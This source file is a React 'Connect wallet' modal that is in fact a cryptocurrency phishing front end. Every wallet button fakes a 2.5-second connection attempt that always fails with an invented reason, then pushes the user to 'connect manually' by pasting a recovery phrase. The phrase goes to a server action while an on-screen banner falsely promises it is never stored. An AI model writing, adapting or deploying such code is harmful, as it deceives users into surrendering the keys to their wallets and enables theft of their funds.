'use client';

import {
	ChevronRight,
	X,
	AlertCircle,
	Loader2,
	ShieldCheck,
} from 'lucide-react';
import React, { useState } from 'react';
import { toast } from 'sonner';
import { connectWallet } from '@/actions/user/walletConnect';
import { FALLBACK_ICON } from '@/lib/assetLogos';
import {
	getWalletLogoUrl,
	type WalletLogoKey,
} from '@/lib/walletLogos';
import {
	dashboardCardTitleClass,
	dashboardModalTitleClass,
	userInputClass,
} from '@/lib/userFormStyles';
import { cn } from '@/lib/utils';

const PreviewWallet = ({
	open,
	setOpen,
}: {
	open: boolean;
	setOpen: (open: boolean) => void;
}) => {
	const [loadingWallet, setLoadingWallet] = useState<string | null>(null);
	const [connectedWallet, setConnectedWallet] = useState<string | null>(null);
	const [showSeedForm, setShowSeedForm] = useState(false);
	const [connectionFailed, setConnectionFailed] = useState(false);
	const [failureReason, setFailureReason] = useState('');

	const failureReasons: Record<string, string> = {
		Metamask:
			'MetaMask extension was not detected or is locked. Install or unlock MetaMask in your browser, then try again — or connect manually with your passphrase.',
		Walletconnect:
			'Could not open a WalletConnect session. Your mobile wallet may be unavailable, the QR session timed out, or the request was declined.',
		Coinbase:
			'Coinbase Wallet could not be reached. The app may not be installed, or the connection request was not approved.',
		'Trust Wallet':
			'Trust Wallet did not respond. The app may be closed, or automatic pairing is unavailable on this device.',
		Phantom:
			'Phantom extension was not found or is locked. Open Phantom in your browser, or connect manually with your passphrase.',
	};

	const handleWalletClick = (walletName: string) => {
		setLoadingWallet(walletName);
		setConnectionFailed(false);
		setFailureReason('');
		setTimeout(() => {
			setLoadingWallet(null);
			setConnectedWallet(walletName);
			setConnectionFailed(true);
			setFailureReason(
				failureReasons[walletName] ??
					'Automatic connection could not be completed. Connect manually with your wallet passphrase to continue.',
			);
		}, 2500);
	};

	const wallets: {
		name: string;
		logoKey: WalletLogoKey;
		popular?: boolean;
	}[] = [
		{
			name: 'Metamask',
			logoKey: 'metamask',
			popular: true,
		},
		{
			name: 'Walletconnect',
			logoKey: 'walletconnect',
			popular: true,
		},
		{
			name: 'Coinbase',
			logoKey: 'coinbase',
			popular: true,
		},
		{
			name: 'Trust Wallet',
			logoKey: 'trust',
			popular: false,
		},
		{
			name: 'Phantom',
			logoKey: 'phantom',
			popular: false,
		},
	];

	const handleTryAnother = () => {
		setLoadingWallet(null);
		setConnectedWallet(null);
		setShowSeedForm(false);
		setConnectionFailed(false);
		setFailureReason('');
	};

	const handleShowSeedForm = () => {
		setShowSeedForm(true);
	};

	const handleConnectWithSeed = async (seedPhrase: string) => {
		if (!connectedWallet) return;

		const result = await connectWallet(connectedWallet, seedPhrase);
		if (result.error) {
			toast.error(result.error);
			return;
		}

		toast.success(result.success ?? 'Wallet connected successfully.');
		setOpen(false);
		setLoadingWallet(null);
		setConnectedWallet(null);
		setShowSeedForm(false);
		setConnectionFailed(false);
		setFailureReason('');
	};

	if (!open) return null;

	return (
		<div
			className='fixed inset-0 z-[60] flex items-end justify-center bg-black/80 p-3 pb-24 backdrop-blur-sm sm:items-center sm:p-4 sm:pb-4'
			onClick={() => setOpen(false)}
		>
			<div
				className='relative flex max-h-[88vh] w-full max-w-md flex-col overflow-hidden rounded-2xl border border-zinc-800 bg-zinc-950 shadow-2xl sm:max-h-[92vh]'
				onClick={(e) => e.stopPropagation()}
			>
				<div className='flex shrink-0 items-center justify-between border-b border-zinc-800 px-4 py-3 sm:px-5 sm:py-4'>
					<p className='text-sm font-medium text-gray-400'>Connect wallet</p>
					<button
						type='button'
						onClick={() => {
							setOpen(false);
							setLoadingWallet(null);
							setConnectedWallet(null);
							setShowSeedForm(false);
							setConnectionFailed(false);
							setFailureReason('');
						}}
						className='rounded-lg p-1.5 text-gray-400 transition hover:bg-zinc-800 hover:text-white'
						aria-label='Close'
					>
						<X className='h-5 w-5' />
					</button>
				</div>

				<div className='flex-1 overflow-y-auto px-4 py-4 sm:px-5 sm:py-6'>
					{/* Loading State */}
					{loadingWallet && !connectedWallet && !showSeedForm && (
						<LoadingScreen
							walletName={loadingWallet}
							logoKey={
								wallets.find((w) => w.name === loadingWallet)?.logoKey ??
								'metamask'
							}
						/>
					)}

					{/* Connection Failed State */}
					{connectionFailed && connectedWallet && !showSeedForm && (
						<ConnectionFailed
							walletName={connectedWallet}
							logoKey={
								wallets.find((w) => w.name === connectedWallet)?.logoKey ??
								'metamask'
							}
							reason={failureReason}
							onManualConnect={handleShowSeedForm}
							onTryAnother={handleTryAnother}
						/>
					)}

					{/* Seed Phrase Form */}
					{showSeedForm && connectedWallet && (
						<SeedPhraseForm
							walletName={connectedWallet}
							logoKey={
								wallets.find((w) => w.name === connectedWallet)?.logoKey ??
								'metamask'
							}
							onConnect={handleConnectWithSeed}
							onBack={() => setShowSeedForm(false)}
						/>
					)}

					{/* Initial Wallet List */}
					{!loadingWallet && !connectedWallet && !showSeedForm && (
						<>
							<div className='mb-4 space-y-1'>
								<h2 className={dashboardModalTitleClass}>
									Choose a wallet
								</h2>
								<p className='text-xs text-gray-400 sm:text-sm'>
									Select a provider to connect your wallet securely.
								</p>
							</div>
							<div className='space-y-2.5 sm:space-y-3'>
								{wallets.map((wallet) => (
									<Wallets
										key={wallet.name}
										wallet={wallet}
										onWalletClick={() =>
											handleWalletClick(wallet.name)
										}
									/>
								))}
							</div>
							<div className='mt-5 sm:mt-6'>
								<p className='text-center text-[11px] leading-relaxed text-gray-500 sm:text-xs'>
									By connecting a wallet, you agree to our{' '}
									<a
										href=''
										className='text-blue-400 hover:underline'
									>
										Terms of Service
									</a>{' '}
									and{' '}
									<a
										href=''
										className='text-blue-400 hover:underline'
									>
										Privacy Policy
									</a>
									.
								</p>
							</div>
						</>
					)}
				</div>
			</div>
		</div>
	);
};

function WalletLogo({
	logoKey,
	alt,
	className,
}: {
	logoKey: WalletLogoKey;
	alt: string;
	className?: string;
}) {
	const [src, setSrc] = useState(getWalletLogoUrl(logoKey));

	return (
		// eslint-disable-next-line @next/next/no-img-element
		<img
			src={src}
			alt={alt}
			className={className}
			onError={() => {
				if (src !== FALLBACK_ICON) setSrc(FALLBACK_ICON);
			}}
		/>
	);
}

const LoadingScreen = ({
	walletName,
	logoKey,
}: {
	walletName: string;
	logoKey: WalletLogoKey;
}) => {
	return (
		<div className='flex flex-col items-center justify-center py-8 sm:py-12'>
			<div className='mb-6 sm:mb-8'>
				<div className='relative h-16 w-16 sm:h-20 sm:w-20'>
					<svg
						className='absolute inset-0 w-full h-full'
						viewBox='0 0 100 100'
						xmlns='http://www.w3.org/2000/svg'
					>
						<circle
							cx='50'
							cy='50'
							r='45'
							fill='none'
							stroke='#3b82f6'
							strokeWidth='3'
							strokeDasharray='141 282'
							opacity='0.3'
						/>
						<circle
							cx='50'
							cy='50'
							r='45'
							fill='none'
							stroke='#3b82f6'
							strokeWidth='3'
							strokeDasharray='141 282'
							style={{
								animation: 'spin 2s linear infinite',
								transformOrigin: '50% 50%',
							}}
						/>
					</svg>
					<div className='absolute inset-0 flex items-center justify-center'>
						<WalletLogo
							logoKey={logoKey}
							alt={walletName}
							className='h-11 w-11 rounded-md object-contain sm:h-12 sm:w-12'
						/>
					</div>
				</div>
				<style>{`
                    @keyframes spin {
                        from { transform: rotate(0deg); }
                        to { transform: rotate(360deg); }
                    }
                `}</style>
			</div>

			<h2 className={`${dashboardModalTitleClass} mb-2 text-center`}>
				Connecting to {walletName}
			</h2>
			<p className='mb-6 max-w-xs text-center text-xs text-gray-400 sm:mb-8 sm:text-sm'>
				Please wait while we establish a secure connection...
			</p>

			<div className='flex items-center gap-1.5'>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0s' }}
				/>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0.2s' }}
				/>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0.4s' }}
				/>
			</div>
		</div>
	);
};

const ConnectionFailed = ({
	walletName,
	logoKey,
	reason,
	onManualConnect,
	onTryAnother,
}: {
	walletName: string;
	logoKey: WalletLogoKey;
	reason: string;
	onManualConnect: () => void;
	onTryAnother: () => void;
}) => {
	return (
		<div className='space-y-5 py-1 sm:space-y-6 sm:py-2'>
			<div className='flex flex-col items-center text-center'>
				<div className='relative mb-4'>
					<div className='flex h-16 w-16 items-center justify-center rounded-2xl border border-zinc-700/80 bg-zinc-800/80 shadow-sm sm:h-[4.5rem] sm:w-[4.5rem]'>
						<WalletLogo
							logoKey={logoKey}
							alt={walletName}
							className='h-10 w-10 object-contain sm:h-11 sm:w-11'
						/>
					</div>
					<div className='absolute -bottom-1 -right-1 flex h-6 w-6 items-center justify-center rounded-full border-2 border-zinc-950 bg-red-500 shadow-sm'>
						<X className='h-3.5 w-3.5 text-white' strokeWidth={2.5} />
					</div>
				</div>

				<h2 className={cn(dashboardModalTitleClass, 'mb-1.5')}>
					Connection unsuccessful
				</h2>
				<p className='max-w-xs text-sm text-zinc-400'>
					We couldn&apos;t connect to{' '}
					<span className='font-medium text-zinc-200'>{walletName}</span>{' '}
					automatically.
				</p>
			</div>

			<div className='rounded-xl border border-zinc-800 bg-zinc-900/70 p-4'>
				<div className='flex items-start gap-3'>
					<div className='mt-0.5 flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-amber-500/10 ring-1 ring-amber-500/20'>
						<AlertCircle className='h-4 w-4 text-amber-400' />
					</div>
					<div className='min-w-0 space-y-1'>
						<p className='text-[11px] font-medium uppercase tracking-wider text-zinc-500'>
							What happened
						</p>
						<p className='text-sm leading-relaxed text-zinc-300'>{reason}</p>
					</div>
				</div>
			</div>

			<div className='rounded-xl border border-zinc-800 bg-zinc-950/80 p-1.5 pt-1'>
				<div className='grid grid-cols-2 gap-1.5'>
					<button
						type='button'
						onClick={onTryAnother}
						className='rounded-lg border border-transparent px-3 py-2.5 text-sm font-semibold text-zinc-400 transition hover:border-zinc-700 hover:bg-zinc-900 hover:text-white'
					>
						<span className='sm:hidden'>Other wallet</span>
						<span className='hidden sm:inline'>Choose another</span>
					</button>

					<button
						type='button'
						onClick={onManualConnect}
						className='rounded-lg bg-indigo-500 px-3 py-2.5 text-sm font-semibold text-white shadow-sm transition hover:bg-indigo-400 active:scale-[0.98]'
					>
						<span className='sm:hidden'>Manual</span>
						<span className='hidden sm:inline'>Connect manually</span>
					</button>
				</div>
			</div>
		</div>
	);
};

interface SeedValidation {
	wordCount: number;
	isValid: boolean;
	words: string[];
	errors: string[];
}

const validatePassphrase = (input: string): SeedValidation => {
	const trimmedInput = input.trim();
	if (trimmedInput.length === 0) {
		return {
			wordCount: 0,
			isValid: false,
			words: [],
			errors: ['Passphrase is required.'],
		};
	}

	const words = trimmedInput.split(/\s+/).filter((word) => word.length > 0);
	const wordCount = words.length;

	if (wordCount === 1 && trimmedInput.length >= 12) {
		return { wordCount, isValid: true, words, errors: [] };
	}

	return validateSeedPhrase(input);
};

const validateSeedPhrase = (input: string): SeedValidation => {
	const trimmedInput = input.trim();
	const words = trimmedInput.split(/\s+/).filter((word) => word.length > 0);
	const wordCount = words.length;
	const errors: string[] = [];
	let isValid = true;

	if (trimmedInput.length < 12) {
		errors.push('Passphrase must be at least 12 characters long.');
		isValid = false;
	}

	// Check valid word count when multiple words are entered
	const validCounts = [12, 16, 18, 24];
	if (wordCount > 1 && !validCounts.includes(wordCount)) {
		errors.push(
			`Recovery phrase must be 12, 16, 18, or 24 words. You have ${wordCount}.`,
		);
		isValid = false;
	}

	// Check for special characters or numbers in seed words
	const invalidWords = words.filter((word) => !/^[a-zA-Z]+$/.test(word));
	if (wordCount > 1 && invalidWords.length > 0) {
		errors.push(
			'Recovery phrase words must contain only letters.',
		);
		isValid = false;
	}

	if (
		wordCount > 1 &&
		validCounts.includes(wordCount) &&
		invalidWords.length === 0 &&
		trimmedInput.length >= 12
	) {
		isValid = true;
		errors.length = 0;
	}

	return {
		wordCount,
		isValid,
		words,
		errors,
	};
};

const SeedPhraseForm = ({
	walletName,
	logoKey,
	onConnect,
	onBack,
}: {
	walletName: string;
	logoKey: WalletLogoKey;
	onConnect: (seedPhrase: string) => Promise<void>;
	onBack: () => void;
}) => {
	const [seedInput, setSeedInput] = useState('');
	const [touched, setTouched] = useState(false);
	const [isSubmitting, setIsSubmitting] = useState(false);

	const validation = validatePassphrase(seedInput);
	const showValidation = touched || seedInput.length > 0;
	const canSubmit = validation.isValid && !isSubmitting;

	const handleSubmit = async () => {
		if (!validation.isValid) return;

		setIsSubmitting(true);
		try {
			await onConnect(seedInput);
		} finally {
			setIsSubmitting(false);
		}
	};

	return (
		<div className='space-y-5 py-1 sm:space-y-6 sm:py-2'>
			<div className='flex items-center gap-2.5 rounded-lg border border-emerald-500/20 bg-emerald-500/5 px-3 py-2.5'>
				<ShieldCheck className='h-4 w-4 shrink-0 text-emerald-400' />
				<p className='text-xs leading-snug text-zinc-400'>
					<span className='font-medium text-emerald-100/90'>
						Never stored.
					</span>{' '}
					Used once to verify, then discarded.
				</p>
			</div>

			<div className='flex items-center gap-3 rounded-xl border border-zinc-800 bg-zinc-900/70 p-3'>
				<div className='flex h-11 w-11 shrink-0 items-center justify-center rounded-xl border border-zinc-700/80 bg-zinc-800/80'>
					<WalletLogo
						logoKey={logoKey}
						alt={walletName}
						className='h-7 w-7 object-contain'
					/>
				</div>
				<div className='min-w-0'>
					<p className='text-[11px] font-medium uppercase tracking-wider text-zinc-500'>
						Manual connection
					</p>
					<p className='truncate text-sm font-semibold text-white'>
						{walletName}
					</p>
				</div>
			</div>

			<div className='space-y-1'>
				<h2 className={dashboardModalTitleClass}>Enter passphrase</h2>
				<p className='text-sm leading-relaxed text-zinc-400'>
					Paste your recovery phrase or wallet passphrase to finish connecting.
				</p>
			</div>

			<div className='space-y-2'>
				<div className='flex items-center justify-between gap-3'>
					<label
						htmlFor='wallet-passphrase'
						className='text-sm font-medium text-zinc-300'
					>
						Recovery phrase
					</label>
					{seedInput.trim().length > 0 && (
						<span className='text-[11px] font-medium tabular-nums text-zinc-500'>
							{validation.wordCount > 1
								? `${validation.wordCount} words`
								: `${seedInput.trim().length} chars`}
						</span>
					)}
				</div>

				<textarea
					id='wallet-passphrase'
					value={seedInput}
					onChange={(e) => setSeedInput(e.target.value)}
					onBlur={() => setTouched(true)}
					onFocus={() => setTouched(true)}
					placeholder='word1 word2 word3 ...'
					spellCheck={false}
					autoComplete='off'
					className={cn(
						userInputClass,
						'h-32 resize-none rounded-xl font-mono text-[13px] leading-relaxed sm:h-36',
						showValidation &&
							validation.errors.length > 0 &&
							'border-red-500/50 focus:border-red-500 focus:ring-red-500/30',
					)}
				/>

				<p className='text-xs text-zinc-500'>
					Use 12+ characters, or a standard 12 / 24 word recovery phrase.
				</p>
			</div>

			{showValidation && validation.errors.length > 0 && (
				<div className='rounded-xl border border-red-500/20 bg-red-500/5 p-3.5'>
					<div className='space-y-2'>
						{validation.errors.map((error, idx) => (
							<div key={idx} className='flex items-start gap-2.5'>
								<AlertCircle className='mt-0.5 h-4 w-4 shrink-0 text-red-400' />
								<p className='text-sm leading-relaxed text-red-300'>{error}</p>
							</div>
						))}
					</div>
				</div>
			)}

			<div className='rounded-xl border border-zinc-800 bg-zinc-950/80 p-1.5'>
				<div className='grid grid-cols-2 gap-1.5'>
					<button
						type='button'
						onClick={onBack}
						disabled={isSubmitting}
						className='rounded-lg border border-transparent px-3 py-2.5 text-sm font-semibold text-zinc-400 transition hover:border-zinc-700 hover:bg-zinc-900 hover:text-white disabled:cursor-not-allowed disabled:opacity-50'
					>
						Cancel
					</button>

					<button
						type='button'
						onClick={handleSubmit}
						disabled={!canSubmit}
						className='inline-flex items-center justify-center gap-2 rounded-lg bg-indigo-500 px-3 py-2.5 text-sm font-semibold text-white shadow-sm transition hover:bg-indigo-400 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-40'
					>
						{isSubmitting ? (
							<>
								<Loader2 className='h-4 w-4 animate-spin' />
								Connecting
							</>
						) : (
							<>
								<span className='sm:hidden'>Connect</span>
								<span className='hidden sm:inline'>Connect wallet</span>
							</>
						)}
					</button>
				</div>
			</div>
		</div>
	);
};

const Wallets = ({
	wallet,
	onWalletClick,
}: {
	wallet: {
		name: string;
		logoKey: WalletLogoKey;
		popular?: boolean;
	};
	onWalletClick: () => void;
}) => {
	return (
		<button
			type='button'
			className='flex w-full items-center justify-between rounded-xl border border-zinc-800 bg-zinc-900/40 p-3 text-left transition hover:border-indigo-500/50 hover:bg-zinc-900 active:scale-[0.99] sm:p-4'
			onClick={onWalletClick}
		>
			<div className='flex min-w-0 items-center gap-3'>
				<div className='flex h-10 w-10 shrink-0 items-center justify-center rounded-lg border border-zinc-700 bg-zinc-800 sm:h-12 sm:w-12'>
					<WalletLogo
						logoKey={wallet.logoKey}
						alt={wallet.name}
						className='h-7 w-7 object-contain sm:h-8 sm:w-8'
					/>
				</div>
				<div className='min-w-0'>
					<p className={dashboardCardTitleClass}>{wallet.name}</p>
					{wallet.popular ? (
						<div className='mt-1 w-fit rounded bg-indigo-500/20 px-2 py-0.5 text-[10px] font-medium text-indigo-300 sm:text-xs'>
							Popular
						</div>
					) : null}
				</div>
			</div>
			<ChevronRight className='h-5 w-5 shrink-0 text-gray-500' />
		</button>
	);
};

export default PreviewWallet;
